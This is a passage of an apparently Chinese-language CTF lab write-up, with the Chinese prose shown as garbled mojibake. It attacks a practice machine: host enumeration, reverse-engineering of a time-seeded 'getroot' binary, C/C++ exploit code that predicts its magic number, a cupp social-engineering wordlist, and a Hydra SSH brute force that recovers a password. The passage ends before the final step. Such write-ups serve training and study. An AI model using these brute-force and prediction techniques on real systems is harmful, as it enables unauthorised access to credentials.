-rw-r--r-- 1 lamb lamb  220 Feb 19 09:23 .bash_logout
-rw-r--r-- 1 lamb lamb 3526 Feb 19 09:23 .bashrc
-rw-r--r-- 1 lamb lamb  807 Feb 19 09:23 .profile
-rw------- 1 lamb lamb    0 Feb 20 03:18 .viminfo
-rw-r--r-- 1 root root  528 Feb 24 07:52 this_is_a_tips.txt
-rw-r--r-- 1 lamb lamb   39 Feb 24 07:52 use3e3e3e3e3sr.txt
(remote) lamb@pwnding:/home/lamb$ cat this_is_a_tips.txt
There is a fun tool called cupp.
I heard it's a good social engineering dictionary generator.
Are there really people that stupid these days? haha.
There is only one way to become ROOT, which is to execute getroot!!!
And don't forget, this is a PWN type machine.

æœ‰ä¸€ä¸ªå¾ˆå¥½ç©çš„å·¥å…·å«åš cupp.
å¬è¯´é‚£æ˜¯ä¸€ä¸ªä¸é”™çš„ç¤¾ä¼šå·¥ç¨‹å­¦å­—å…¸ç”Ÿæˆå™¨.
ç°åœ¨çœŸçš„è¿˜ä¼šæœ‰äººè¿™ä¹ˆè ¢å—ï¼Ÿhaha.
æˆä¸º ROOT çš„æ–¹æ³•åªæœ‰ä¸€æ¡ï¼Œå°±æ˜¯æ‰§è¡Œ getroot !!!
è€Œä¸”ä½ ä¸è¦å¿˜è®°äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªpwnç±»å‹çš„æœºå™¨.
(remote) lamb@pwnding:/home/lamb$ cat use3e3e3e3e3sr.txt
flag{3a463d08f2ae11efbeb6000c29094b2d}
```

è¯´æ˜éœ€è¦ä½¿ç”¨`cupp`è¿™ä¸ªå·¥å…·ï¼Œå°è¯•è¿›è¡Œä¿¡æ¯æœé›†ï¼š

```bash
(remote) lamb@pwnding:/home/lamb$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/chfn
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/su
/usr/bin/chsh

(remote) lamb@pwnding:/home/lamb$ find / -group lamb  2>/dev/null | grep -v proc
/var/lib/sudo/lectured/lamb
/home/lamb
/home/lamb/.viminfo
/home/lamb/.profile
/home/lamb/.bashrc
/home/lamb/use3e3e3e3e3sr.txt
/home/lamb/.bash_logout
/home/lamb/.bash_history
```

ç„¶åæ‰¾åˆ°äº†è¿™ä¸ªç¨‹åºï¼Œå°è¯•ä¸‹è½½åˆ°æœ¬åœ°è¿›è¡Œæµ‹è¯•ï¼š

```bash
(remote) lamb@pwnding:/home/lamb$ whereis getroot
getroot: /usr/local/bin/getroot
(remote) lamb@pwnding:/home/lamb$ getroot
Usage: getroot <magic_number>
(remote) lamb@pwnding:/home/lamb$ ls -la /usr/local/bin/getroot
-rwxr-xr-x 1 root root 18912 Feb 20 02:19 /usr/local/bin/getroot
(remote) lamb@pwnding:/home/lamb$ file /usr/local/bin/getroot
/usr/local/bin/getroot: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5b496760c7d2337cf4d56eef4b9a0c2e1c6e8e36, not stripped
```

çœ‹ä¸€ä¸‹ä¿æŠ¤ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ pwn checksec getroot 
[*] '/home/kali/temp/easypwn/getroot'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

`IDA`æ‰“å¼€çœ‹ä¸€ä¸‹ï¼š

```c
// main.c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  double v3; // xmm0_8
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rax
  int v8; // ebx
  unsigned int v9; // eax
  __int64 v10; // rax
  __int64 v11; // rax
  char v13; // [rsp+10h] [rbp-260h]
  __int64 v14; // [rsp+110h] [rbp-160h]
  char v15; // [rsp+220h] [rbp-50h]
  int v16; // [rsp+240h] [rbp-30h]
  int v17; // [rsp+244h] [rbp-2Ch]
  int v18; // [rsp+248h] [rbp-28h]
  char v19; // [rsp+24Fh] [rbp-21h]
  double v20; // [rsp+250h] [rbp-20h]
  int v21; // [rsp+258h] [rbp-18h]
  int v22; // [rsp+25Ch] [rbp-14h]

  if ( argc > 1 )
  {
    v22 = atoi(argv[1]);
    v9 = time(0LL);
    srand(v9);
    v21 = rand() % 86400;
    generate_normal_distribution();
    v20 = v3;
    v16 = (signed int)(5.0 * v3) + v21;
    v17 = 86399;
    v10 = std::min<int>(&v16, &v17);
    v18 = 0;
    v16 = *(_DWORD *)std::max<int>(&v18, v10);
    std::allocator<char>::allocator(&v19);
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v15, "/root/cred", &v19);
    std::allocator<char>::~allocator(&v19);
    if ( v22 == v16 + 12345 )
    {
      std::basic_ifstream<char,std::char_traits<char>>::basic_ifstream(&v13, &v15, 8LL);
      if ( (unsigned __int8)std::basic_ios<char,std::char_traits<char>>::operator bool(&v14) )
      {
        v11 = std::basic_ifstream<char,std::char_traits<char>>::rdbuf(&v13);
        std::ostream::operator<<(&std::cout, v11);
      }
      std::basic_ifstream<char,std::char_traits<char>>::~basic_ifstream(&v13);
    }
    v8 = 0;
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v15);
  }
  else
  {
    v4 = std::operator<<<std::char_traits<char>>(&std::cerr, "Usage: ", envp);
    v5 = std::operator<<<std::char_traits<char>>(v4, *argv, v4);
    v7 = std::operator<<<std::char_traits<char>>(v5, " <magic_number>", v6);
    std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
    v8 = 1;
  }
  return v8;
}
```

```c
// generate_normal_distribution
double generate_normal_distribution(void)
{
  double x; // ST18_8
  double v1; // ST10_8
  double v2; // xmm0_8
  double v3; // ST08_8

  x = (double)rand() / 2147483647.0;
  v1 = (double)rand() / 2147483647.0;
  v2 = log(x);
  v3 = sqrt(-2.0 * v2);
  return cos(6.283185307179586 * v1) * v3;
}
```

### AIå®¡è®¡ä»£ç 

ä¸¢ç»™aiçœ‹å§ï¼š

> æ ¹æ®æä¾›çš„ä»£ç ï¼Œæˆ‘å°†ä»å‡½æ•°ç­¾åã€é€»è¾‘æµç¨‹ã€å®‰å…¨æœºåˆ¶å’Œå…³é”®å‡½æ•°å››ä¸ªæ–¹é¢è¿›è¡Œå…¨é¢åˆ†æï¼š
>
> ### 1. **å‡½æ•°ç­¾åä¸å‚æ•°è§£æ
>
> ```c
> int __cdecl main(int argc, const char **argv, const char **envp)
> ```
>
> - `__cdecl`è°ƒç”¨çº¦å®šï¼š
>   - C/C++é»˜è®¤è°ƒç”¨çº¦å®šï¼Œå‚æ•°ä»å³å‘å·¦å‹æ ˆï¼Œè°ƒç”¨æ–¹æ¸…ç†å †æ ˆ
>   - æ”¯æŒå¯å˜å‚æ•°å‡½æ•°ï¼ˆå¦‚printfï¼‰ï¼Œæ— å‚æ•°æ•°é‡é™åˆ¶
> - å‚æ•°ç»“æ„ï¼š
>   - `argc`ï¼šå‘½ä»¤è¡Œå‚æ•°æ•°é‡ï¼ˆå«ç¨‹åºåï¼‰
>   - `argv`ï¼šå‚æ•°å€¼æ•°ç»„ï¼ˆ`argv[0]`=ç¨‹åºè·¯å¾„ï¼‰
>   - `envp`ï¼šç¯å¢ƒå˜é‡æ•°ç»„ï¼ˆæœªä½¿ç”¨ï¼‰
>
> ### 2. **æ ¸å¿ƒé€»è¾‘æµç¨‹**
>
> #### A. å‚æ•°æ ¡éªŒåˆ†æ”¯
>
> ```c
> if (argc > 1) {
>     // ä¸»é€»è¾‘
> } else {
>     // æ‰“å°ä½¿ç”¨è¯´æ˜
>     std::cerr << "Usage: " << argv[0] << " <magic_number>";
>     return 1;
> }
> ```
>
> - **æ— å‚æ•°æ—¶**ï¼šè¾“å‡ºå¸®åŠ©ä¿¡æ¯å¹¶è¿”å›é”™è¯¯ç `1`
> - **æœ‰å‚æ•°æ—¶**ï¼šè¿›å…¥è®¤è¯é€»è¾‘
>
> #### B. è®¤è¯æœºåˆ¶å®ç°
>
> <img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506101849652.png" alt="a" style="zoom:33%;" />
>
> #### C. æ–‡ä»¶æ“ä½œ
>
> ```c
> if (v22 == v16 + 12345) {
>     std::ifstream file("/root/cred");
>     if (file) std::cout << file.rdbuf();
> }
> ```
>
> - **æƒé™è¦æ±‚**ï¼šéœ€rootæƒé™è®¿é—®`/root/cred`
> - **å®‰å…¨é£é™©**ï¼šç¡¬ç¼–ç è·¯å¾„å¯èƒ½å¼•å‘è·¯å¾„éå†æ¼æ´
>
> ### 3. **å®‰å…¨æœºåˆ¶åˆ†æ**
>
> #### a) éšæœºæ•°ç”Ÿæˆ
>
> ```c
> v9 = time(0LL);
> srand(v9);  // åŸºäºæ—¶é—´çš„ç§å­
> v21 = rand() % 86400;  // 0-86399çš„éšæœºå€¼
> ```
>
> - **æ¼æ´**ï¼š`time(0)`ç²¾åº¦ä¸ºç§’çº§ï¼Œæ”»å‡»è€…å¯çˆ†ç ´æ—¶é—´çª—å£
> - **æ”¹è¿›å»ºè®®**ï¼šæ”¹ç”¨`/dev/urandom`æˆ–`rdrand`æŒ‡ä»¤
>
> #### b) æ­£æ€åˆ†å¸ƒå˜æ¢
>
> ```c
> double generate_normal_distribution() {
>     double u1 = rand() / 2147483647.0;  // [0,1]å‡åŒ€åˆ†å¸ƒ
>     double u2 = rand() / 2147483647.0;
>     return cos(2*M_PI*u2) * sqrt(-2*log(u1)); // Box-Mullerå˜æ¢
> }
> ```
>
> - **ç®—æ³•**ï¼šBox-Mullerå°†å‡åŒ€åˆ†å¸ƒè½¬ä¸ºæ ‡å‡†æ­£æ€åˆ†å¸ƒ
> - **ä½œç”¨**ï¼šå¢åŠ `v16`çš„éšæœºæ€§ï¼ˆåç§»Â±15ç§’ï¼‰
>
> #### c) é­”æ³•æ•°å­—æ ¡éªŒ
>
> ```c
> v16 = clamp(5*v3 + v21, 0, 86399);
> if (v22 == v16 + 12345)  // é™æ€åç§»
> ```
>
> - **çˆ†ç ´éš¾åº¦**ï¼šçº¦`86400 * 30 â‰ˆ 2.6e6`ç§å¯èƒ½ï¼ˆå¯æ¥å—ï¼‰
> - **ç¼ºé™·**ï¼šæœªé˜²é‡æ”¾æ”»å‡»ï¼Œæœ‰æ•ˆæœŸä¸º1ç§’
>
> ### 4. **å…³é”®é£é™©ä¸æ”¹è¿›**
>
> |       é£é™©ç‚¹       |     å±å®³     |       è§£å†³æ–¹æ¡ˆ       |
> | :----------------: | :----------: | :------------------: |
> | `/root/cred`ç¡¬ç¼–ç  |   è·¯å¾„åŠ«æŒ   |   é…ç½®æ–‡ä»¶åŠ¨æ€åŠ è½½   |
> |   æ—¶é—´ç§å­å¯é¢„æµ‹   | é­”æ³•æ•°å­—çˆ†ç ´ | æ··åˆè¿›ç¨‹ID+ç¡¬ä»¶ç†µæº  |
> |     æ— è¾“å…¥è¿‡æ»¤     |  ç¼“å†²åŒºæº¢å‡º  | æ·»åŠ `strtol`é”™è¯¯æ£€æŸ¥ |
> |     æ–‡ä»¶æœªéªŒè¯     | ç¬¦å·é“¾æ¥æ”»å‡» |   æ·»åŠ `lstat`æ ¡éªŒ    |
>
> ### æ€»ç»“
>
> è¯¥ç¨‹åºå®ç°äº†ä¸€ä¸ªåŸºäºåŠ¨æ€é­”æ³•æ•°å­—çš„è®¤è¯æœºåˆ¶ï¼Œæ ¸å¿ƒæ˜¯é€šè¿‡æ­£æ€åˆ†å¸ƒéšæœºæ•°å¢åŠ çˆ†ç ´éš¾åº¦ã€‚ä¸»è¦æ”¹è¿›æ–¹å‘ï¼š
>
> 1. **å¢å¼ºç†µæº**ï¼šä½¿ç”¨`getrandom()`æ›¿ä»£`time()+rand()`
> 2. **è·¯å¾„å®‰å…¨**ï¼šé¿å…ç¡¬ç¼–ç ç‰¹æƒè·¯å¾„
> 3. **é”™è¯¯å¤„ç†**ï¼šæ·»åŠ `atoi`çš„å¼‚å¸¸æ£€æµ‹
> 4. **æ—¥å¿—ç›‘æ§**ï¼šè®°å½•å¤±è´¥å°è¯•é˜²çˆ†ç ´
>
> > å®Œæ•´æ‰§è¡Œæµç¨‹ï¼šç”¨æˆ·è¾“å…¥â†’æ—¶é—´ç†µåˆå§‹åŒ–â†’æ­£æ€åˆ†å¸ƒåç§»è®¡ç®—â†’é­”æ³•æ•°å­—æ ¡éªŒâ†’ç‰¹æƒæ–‡ä»¶è®¿é—®ã€‚å…¶è®¾è®¡é€‚åˆçŸ­æœŸæœ‰æ•ˆçš„è®¤è¯åœºæ™¯ï¼Œä½†éœ€åŠ å›ºéšæœºæ•°ç”Ÿæˆç¯èŠ‚-
>
> ### ğŸ”‘ **å¯†é’¥ç”Ÿæˆæµç¨‹**
>
> 1. **åˆå§‹åŒ–éšæœºç§å­**
>
>    ```c
>    v9 = time(0LL);  // è·å–å½“å‰æ—¶é—´æˆ³
>    srand(v9);       // ç”¨æ—¶é—´æˆ³åˆå§‹åŒ–éšæœºç§å­
>    ```
>
>    *ï¼ˆåŸºäºç³»ç»Ÿæ—¶é—´ï¼Œå­˜åœ¨å¯é¢„æµ‹æ€§é£é™©ï¼‰*
>
> 2. **ç”ŸæˆåŸºç¡€éšæœºæ•° `v21`**
>
>    ```c
>    v21 = rand() % 86400;  // ç”Ÿæˆ [0, 86399] çš„éšæœºæ•´æ•°
>    ```
>
>    *ï¼ˆè¦†ç›–ä¸€å¤©çš„æ€»ç§’æ•°ï¼‰*
>
> 3. **ç”Ÿæˆæ­£æ€åˆ†å¸ƒéšæœºæ•° `z0`**
>
>    ```c
>    generate_normal_distribution();  // è°ƒç”¨æ­£æ€åˆ†å¸ƒç”Ÿæˆå‡½æ•°
>    v20 = v3;  // v3 ä¸ºå‡½æ•°è¿”å›å€¼ z0
>    ```
>
>    **å‡½æ•°å†…éƒ¨æ“ä½œ**ï¼š
>
>    - `u1 = rand() / 2147483647.0` â†’ å‡åŒ€åˆ†å¸ƒéšæœºæ•° [0,1]
>
>    - `u2 = rand() / 2147483647.0` â†’ å‡åŒ€åˆ†å¸ƒéšæœºæ•° [0,1]
>
>    - ```
>      z0 = cos(2Ï€ * u2) * sqrt(-2 * ln(u1))
>      ```
>
> 4. **è®¡ç®—ä¸´æ—¶å˜é‡ `temp`**
>
>    ```c
>    temp = (int)(5.0 * z0) + v21;  // å åŠ æ­£æ€åç§»ä¸åŸºç¡€éšæœºæ•°
>    ```
>
> 5. **é’³åˆ¶ `temp` åˆ°åˆæ³•èŒƒå›´**
>
>    ```c
>    v16 = std::min(std::max(0, temp), 86399);  // é™åˆ¶åœ¨ [0, 86399]
>    ```
>
> 6. **ç”Ÿæˆæœ€ç»ˆå¯†é’¥ `key`**
>
>    ```c
>    key = v16 + 12345;  // å åŠ å›ºå®šåç§»é‡
>    ```

ä½¿ç”¨ AI ç»™å‡ºäº†ä¸‹é¢è¿™ä¸ªpayloadä»¥åŒ¹é…å‰é¢çš„é€»è¾‘ï¼š

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <math.h>

// ç”Ÿæˆæ­£æ€åˆ†å¸ƒéšæœºæ•°ï¼ˆBox-Mullerå˜æ¢ï¼‰[2,9](@ref)
double generate_normal_distribution() {
    double u1 = (double)rand() / RAND_MAX;  // [0,1]å‡åŒ€åˆ†å¸ƒ
    double u2 = (double)rand() / RAND_MAX;  // [0,1]å‡åŒ€åˆ†å¸ƒ
    return cos(2 * M_PI * u2) * sqrt(-2 * log(u1));
}

int main() {
    // 1. åˆå§‹åŒ–éšæœºç§å­ï¼ˆåŸºäºå½“å‰æ—¶é—´ï¼‰[2,9](@ref)
    srand(time(NULL));
    
    // 2. ç”ŸæˆåŸºç¡€éšæœºæ•° v21 âˆˆ [0, 86399]
    int v21 = rand() % 86400;
    
    // 3. ç”Ÿæˆæ­£æ€åˆ†å¸ƒéšæœºæ•° z0 [2](@ref)
    double z0 = generate_normal_distribution();
    
    // 4. è®¡ç®—ä¸´æ—¶å€¼ temp = (int)(5.0 * z0) + v21
    int temp = (int)(5.0 * z0) + v21;
    
    // 5. é’³åˆ¶ç»“æœåˆ° [0, 86399] èŒƒå›´
    temp = (temp < 0) ? 0 : (temp > 86399) ? 86399 : temp;
    
    // 6. ç”Ÿæˆæœ€ç»ˆé­”æ³•æ•°å­— key = temp + 12345
    int key = temp + 12345;
    
    printf("%d\n", key);
    return 0;
}
```

è¿›è¡Œç¼–è¯‘ï¼Œå°è¯•çœ‹ä¸€ä¸‹æ˜¯å¦å¯ç”¨ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ gcc exp.c -o exp -lm  

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ file exp                                                                                                                                                                
exp: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=732f39222f1e9627e31e63a54df1026b99b50946, for GNU/Linux 3.2.0, not stripped
```

ä½†æ˜¯å‘ç°æœ¬åœ°ç”Ÿæˆçš„ä¼ ä¸Šå»ç”¨ä¸äº†ï¼Œæ‰€ä»¥ä¼ ä¸Šå»è¿›è¡Œç¼–è¯‘ï¼Œä½†æ˜¯æŠ¥é”™äº†ï¼š

```bash
(remote) lamb@pwnding:/tmp$ gcc exp.c -o exp -lm
collect2: fatal error: cannot find 'ld'
compilation terminated.
```

å°è¯•æ¢ä¸º`c++`ä»£ç ï¼š

```cpp
#include <iostream>
#include <random>
#include <algorithm>

int main() {
    // 1. åˆå§‹åŒ–éšæœºæ•°å¼•æ“ï¼ˆåŸºäºæ—¶é—´ï¼‰
    std::random_device rd;
    std::mt19937 gen(rd());
    
    // 2. ç”ŸæˆåŸºç¡€éšæœºæ•° v21 âˆˆ [0, 86399]
    std::uniform_int_distribution<int> base_dist(0, 86399);
    int v21 = base_dist(gen);
    
    // 3. ç”Ÿæˆæ ‡å‡†æ­£æ€åˆ†å¸ƒéšæœºæ•° (Î¼=0, Ïƒ=1)
    std::normal_distribution<double> normal_dist(0.0, 1.0);
    double z0 = normal_dist(gen);
    
    // 4. è®¡ç®—ä¸´æ—¶å€¼
    int temp = static_cast<int>(5.0 * z0) + v21;
    
    // 5. é’³åˆ¶åˆ°åˆæ³•èŒƒå›´
    temp = std::max(0, std::min(temp, 86399));
    
    // 6. ç”Ÿæˆæœ€ç»ˆé­”æ³•æ•°å­—
    int magic_number = temp + 12345;
    
    std::cout << magic_number << std::endl;
    return 0;
}
```

### ä¿¡æ¯æœé›†

å°è¯•è¿›è¡ŒåŠ«æŒï¼Œä½†æ˜¯å‘ç°éœ€è¦è¯·æ±‚`/root/cred`ï¼Œæ²¡æœ‰æƒé™ï¼Œå‰é¢æç¤ºåˆ°äº†éœ€è¦ç¤¾å·¥è·å–å¯†ç ï¼Œå°è¯•è¿›è¡Œä¿¡æ¯æœé›†ï¼Œä¸Šä¼ `linpeas.sh`ï¼š

å‘ç°å¸¸å¡åœ¨`cloud`ï¼Œå°è¯•è·³è¿‡å»ï¼š

```bash
./linpeas.sh -o system_information,container,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex
```

æ‰¾åˆ°äº†ä¸€äº›æœ‰æ„æ€çš„ä¿¡æ¯ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506101849653.png" alt="image-20250610175108684" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506101849654.png" alt="image-20250610174722752" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506101849655.png" alt="image-20250610175318786" style="zoom:50%;" />

æ‰¾åˆ°äº†ä¸€å¤„å¯è¯»éšè—æ–‡ä»¶åä¸ºï¼š`/var/backups/.secret/.verysecret/.noooooo/note2.txt`çœ‹ä¸€ä¸‹å†…å®¹ï¼š

```bash
The Compass and the Campfire

David knelt beside his ten-year-old son, Jake, their shared backpack spilling onto the forest floor. "Lost?" Jake whispered, staring at the identical trees clawing at the twilight. Davidâ€™s calloused fingers brushed the cracked compass in his palmâ€”a relic from his father, its needle trembling like a moth. "Not lost," he lied. "Justâ€¦ rerouting."

Jakeâ€™s eyes narrowed, too sharp for comfort. "Your compass is broken."

A chuckle escaped David, brittle as dry leaves. "Compasses donâ€™t break, bud. Theyâ€¦ forget." He flipped it open, the glass fogged with age. "See? North isnâ€™t where it should be. Itâ€™s where it chooses to be tonight."

The boy frowned, then yelped as a pinecone thudded beside him. A red squirrel chattered overhead, its tail flicking like a metronome. Jakeâ€™s fear dissolved into giggles. David watched, throat tight. Heâ€™s still young enough to laugh at squirrels.

"Dad?" Jake unzipped his jacket, revealing three granola bars and a glowstick. "Weâ€™ve got supplies. Letâ€™s build a fort."

They wove branches into a crooked shelter, Jakeâ€™s hands steady where Davidâ€™s shook. When the first stars pierced the canopy, David confessed: "Grandpa gave me this compass the day I got lost in the mall. Told me itâ€™d always point home."

Jake snapped the glowstick, bathing their fort in alien green. "Does it work now?"

The needle quivered, settling northwest. Toward the distant highway hum, not their cabinâ€™s woodsmoke. David closed the brass lid. "Nope. But you do." He nodded at Jakeâ€™s pocketâ€”where a crumpled trail map peeked out, dotted with the boyâ€™s doodled dinosaurs.

Dawn found them at the cabinâ€™s porch, guided by Jakeâ€™s roars laughter and the squirrels heâ€™d named "Sir Nibbles". The compass stayed in Davidâ€™s pocket, its secret safe: true north had shifted years ago, anywayâ€”from steel poles to a gap-toothed grin eating pancakes at 6 AM.
```

### ç¤¾å·¥å¯†ç æ–‡ä»¶

å‘ç°è¿™ç¯‡åä¸ºã€ŠæŒ‡å—é’ˆä¸ç¯ç«ã€‹çš„çŸ­æ–‡æåˆ°äº†å‡ ä¸ªç‚¹å¯ä»¥ç”¨æ¥è¿›è¡Œç¤¾å·¥	ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ sudo /opt/pwncat/bin/python3.9 /usr/bin/cupp -i

cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: David
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: Jake
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: 
> Do you want to add special chars at the end of words? Y/[N]: 
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]: 

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to david.txt, counting 212 words.
[+] Now load your pistolero with david.txt and shoot! Good luck!
```

åˆ«ç…§æŠ„æŒ‡ä»¤å“ˆï¼Œè¦æ ¹æ®è‡ªå·±ç¯å¢ƒä¿®æ”¹å“¦ï¼Œå°è¯•è¿›è¡Œçˆ†ç ´ï¼š

### çˆ†ç ´å¯†ç 

```bash
(remote) lamb@pwnding:/home/lamb$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
lamb:x:1001:1001:,,,:/home/lamb:/bin/bash
```

å‘ç°å°±è¿™å‡ ä¸ªç”¨æˆ·ï¼Œè¯´æ˜ç¤¾å·¥å¯†ç å¯èƒ½å°±æ˜¯æœ¬ç”¨æˆ·çš„å¯†ç ï¼Œå°è¯•è¿›è¡Œçˆ†ç ´ç™»å½•ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ hydra -l lamb -P david.txt -f ssh://192.168.10.102:22                                                                             
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-10 06:22:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 212 login tries (l:1/p:212), ~14 tries per task
[DATA] attacking ssh://192.168.10.102:22/
[22][ssh] host: 192.168.10.102   login: lamb   password: ekaJ_2016
[STATUS] attack finished for 192.168.10.102 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-10 06:23:25
```

æ‹¿åˆ°äº†ä¸€ä¸ªå¯†ç `ekaJ_2016`å°è¯•çœ‹çœ‹å¯¹ä¸å¯¹ï¼š

```bash
(remote) lamb@pwnding:/home/lamb$ sudo -l 
[sudo] password for lamb: 
Matching Defaults entries for lamb on pwnding:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lamb may run the following commands on pwnding:
    (ALL : ALL) PASSWD: /usr/local/bin/getroot
```

### getrootè·å–å‡­è¯

å‘ç°æœç„¶æœ‰sudoæƒé™ï¼Œä»å‰é¢çš„ä¿¡æ¯æœé›†å°±çœ‹åˆ°è¿‡ç›¸å…³ä¿¡æ¯ï¼Œå°è¯•è¿›è¡Œè¿è¡Œï¼š

```bash
(remote) lamb@pwnding:/tmp$ which ld
/usr/bin/ld
(remote) lamb@pwnding:/tmp$ ls -la /usr/bin/ld
lrwxrwxrwx 1 root root 19 Mar 21  2019 /usr/bin/ld -> x86_64-linux-gnu-ld
(remote) lamb@pwnding:/tmp$ gcc --help
Usage: gcc [options] file...
Options:
  -pass-exit-codes         Exit with highest error code from a phase.
  --help                   Display this information.
  --target-help            Display target specific command line options.
  --help={common|optimizers|params|target|warnings|[^]{joined|separate|undocumented}}[,...].
                           Display specific types of command line options.
  (Use '-v --help' to display command line options of sub-processes).
  --version                Display compiler version information.
  -dumpspecs               Display all of the built in spec strings.
  -dumpversion             Display the version of the compiler.
  -dumpmachine             Display the compiler's target processor.
  -print-search-dirs       Display the directories in the compiler's search path.
  -print-libgcc-file-name  Display the name of the compiler's companion library.
  -print-file-name=<lib>   Display the full path to library <lib>.
  -print-prog-name=<prog>  Display the full path to compiler component <prog>.
  -print-multiarch         Display the target's normalized GNU triplet, used as
                           a component in the library path.
  -print-multi-directory   Display the root directory for versions of libgcc.
  -print-multi-lib         Display the mapping between command line options and
                           multiple library search directories.
  -print-multi-os-directory Display the relative path to OS libraries.
  -print-sysroot           Display the target libraries directory.
  -print-sysroot-headers-suffix Display the sysroot suffix used to find headers.
  -Wa,<options>            Pass comma-separated <options> on to the assembler.
  -Wp,<options>            Pass comma-separated <options> on to the preprocessor.
  -Wl,<options>            Pass comma-separated <options> on to the linker.
  -Xassembler <arg>        Pass <arg> on to the assembler.
  -Xpreprocessor <arg>     Pass <arg> on to the preprocessor.
  -Xlinker <arg>           Pass <arg> on to the linker.
  -save-temps              Do not delete intermediate files.
  -save-temps=<arg>        Do not delete intermediate files.
  -no-canonical-prefixes   Do not canonicalize paths when building relative
                           prefixes to other gcc components.
  -pipe                    Use pipes rather than intermediate files.
  -time                    Time the execution of each subprocess.
  -specs=<file>            Override built-in specs with the contents of <file>.
  -std=<standard>          Assume that the input sources are for <standard>.
  --sysroot=<directory>    Use <directory> as the root directory for headers
                           and libraries.
  -B <directory>           Add <directory> to the compiler's search paths.
  -v                       Display the programs invoked by the compiler.
  -###                     Like -v but options quoted and commands not executed.
  -E                       Preprocess only; do not compile, assemble or link.
  -S                       Compile only; do not assemble or link.
  -c                       Compile and assemble, but do not link.
  -o <file>                Place the output into <file>.
  -pie                     Create a dynamically linked position independent
                           executable.
  -shared                  Create a shared library.
  -x <language>            Specify the language of the following input files.
                           Permissible languages include: c c++ assembler none
                           'none' means revert to the default behavior of
                           guessing the language based on the file's extension.

Options starting with -g, -f, -m, -O, -W, or --param are automatically
 passed on to the various sub-processes invoked by gcc.  In order to pass
 other options on to these processes the -W<letter> options must be used.

For bug reporting instructions, please see:
<file:///usr/share/doc/gcc-8/README.Bugs>.

(remote) lamb@pwnding:/tmp$ g++ key.c -o key -B /usr/bin
(remote) lamb@pwnding:/tmp$ file key
key: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e089d5a319c7c73af28b06d082802e2b3c32072e, not stripped
```

è¿™é‡Œéœ€è¦æŒ‡å®šæœç´¢è·¯å¾„ï¼Œä¸ç„¶æ‰¾ä¸åˆ°`ld`ï¼Œå°è¯•æ‰§è¡Œï¼Œä½†æ˜¯å¹¶æœªè·å–å‡­è¯ï¼Œè¯´æ˜ä»£ç å¯èƒ½ä¸å¯¹ï¼Œå°è¯•è¿›è¡Œä¿®æ”¹ï¼š

```bash
(remote) lamb@pwnding:/tmp$ while true; do sudo /usr/local/bin/getroot $(./key); sleep 1; done
^C
```

å°è¯•äº†ä¸€ä¸‹å‰é¢çš„cä»£ç ï¼Œå‘ç°ï¼š

```bash
